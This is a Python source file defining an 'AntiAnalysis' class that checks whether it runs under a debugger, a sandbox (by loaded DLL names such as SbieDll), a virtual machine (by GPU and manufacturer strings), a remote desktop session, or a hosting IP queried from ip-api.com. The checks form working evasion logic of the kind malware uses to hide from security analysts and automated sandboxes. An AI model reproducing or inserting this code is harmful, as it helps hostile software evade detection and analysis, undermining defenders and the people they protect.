#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author github.com/L1ghtM4n

__all__ = ["AntiAnalysis", "default_sandbox_dlls", "default_virtualbox_names"]

# Import modules
from ctypes import windll
from urllib.request import urlopen
# Import packages
from .hardware import HardwareInfo


default_sandbox_dlls = [
    "SbieDll",
    "SxIn",
    "Sf2",
    "snxhk",
    "cmdvrt32"
]

default_virtualbox_names = [
    "vbox", "vmbox", "vmware", "virtualbox", "qemu",
    "thinapp", "VMXh", "innotek gmbh", "tpvcgateway",
    "tpautoconnsvc", "kvm", "red hat", "virtual platform"
]


class AntiAnalysis(object):

    def __init__(self, sandbox_dlls=None, virtualbox_names=None):
        self.sandbox_dlls = default_sandbox_dlls
        self.virtualbox_names = default_virtualbox_names

        if sandbox_dlls is not None:
            self.sandbox_dlls = sandbox_dlls

        if virtualbox_names is not None:
            self.virtualbox_names = virtualbox_names

    def __str__(self) -> str:
        return f"""
        IsSandBox={self.IsSandBox}
        IsDebugger={self.IsDebugger}
        IsVirtualBox={self.IsVirtualBox}
        IsRemoteDesktop={self.IsRemoteDesktop}
        IsHosting={self.IsHosting}
        """.replace("        ", "")

    @property
    def IsDebugger(self) -> bool:
        return windll.kernel32.IsDebuggerPresent() != 0

    @property
    def IsSandBox(self) -> bool:
        return any([windll.kernel32.GetModuleHandleW(name + ".dll") != 0 for name in self.sandbox_dlls])

    @property
    def IsVirtualBox(self) -> bool:
        gpu_name = str(HardwareInfo().GPUName).lower()
        manufacturer = str(HardwareInfo().Manufacturer).lower()
        return any([name in gpu_name or name in manufacturer for name in self.virtualbox_names])

    @property
    def IsRemoteDesktop(self) -> bool:
        return windll.user32.GetSystemMetrics(0x1000) != 0

    @property
    def IsHosting(self) -> bool:
        try:
            response = urlopen("http://ip-api.com/line?fields=hosting")
        except Exception:
            return False
        else:
            if response.status == 200:
                return b"true" in response.read()
